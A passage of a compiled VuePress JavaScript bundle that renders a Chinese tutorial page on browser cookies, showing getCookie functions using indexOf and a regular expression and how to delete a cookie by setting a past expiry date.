function"}},[t._v("indexOf")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v('";"')]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v("start"),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token comment"}},[t._v("//返回';'在字符串中首次出现的位置。")]),t._v("\n            "),s("span",{attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("end "),s("span",{attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),s("span",{attrs:{class:"token operator"}},[t._v("-")]),s("span",{attrs:{class:"token number"}},[t._v("1")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("  end "),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t\t"),s("span",{attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),s("span",{attrs:{class:"token function"}},[t._v("unescape")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("substring")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("start"),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v("end"),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" \n    "),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    "),s("span",{attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v('""')]),t._v("\n"),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{attrs:{class:"token function"}},[t._v("getCookie")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'qq'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\t\t"),s("span",{attrs:{class:"token comment"}},[t._v("// qq")]),t._v("\n")])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-javascript extra-class"},[s("pre",{pre:!0,attrs:{class:"language-javascript"}},[s("code",[s("span",{attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),s("span",{attrs:{class:"token function"}},[t._v("getCookie")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("name"),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" \n"),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" \n    "),s("span",{attrs:{class:"token keyword"}},[t._v("var")]),t._v(" arr"),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v("reg"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),s("span",{attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),s("span",{attrs:{class:"token class-name"}},[t._v("RegExp")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v('"(^| )"')]),s("span",{attrs:{class:"token operator"}},[t._v("+")]),t._v("name"),s("span",{attrs:{class:"token operator"}},[t._v("+")]),s("span",{attrs:{class:"token string"}},[t._v('"=([^;]*)(;|$)"')]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n    "),s("span",{attrs:{class:"token keyword"}},[t._v("if")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("arr"),s("span",{attrs:{class:"token operator"}},[t._v("=")]),t._v("document"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("match")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("reg"),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),s("span",{attrs:{class:"token function"}},[t._v("unescape")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),t._v("arr"),s("span",{attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{attrs:{class:"token number"}},[t._v("2")]),s("span",{attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n    "),s("span",{attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),s("span",{attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),s("span",{attrs:{class:"token keyword"}},[t._v("null")]),s("span",{attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n"),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" \n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_5-4-删除一个cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_5-4-删除一个cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" 5.4 删除一个cookie")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("删除一个现存 Cookie 的唯一方法，是设置它的"),e("code",[this._v("expires")]),this._v("属性为一个过去的日期。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[this._v("document.cookie = 'foo=; expires=Thu, 01-Jan-1970 00:00:01 GMT';\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"参考资料"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#参考资料","aria-hidden":"true"}},[this._v("#")]),this._v(" 参考资料")])}],!1,null,null,null);o.options.__file="001-cookie.md";e.default=o.exports}}]);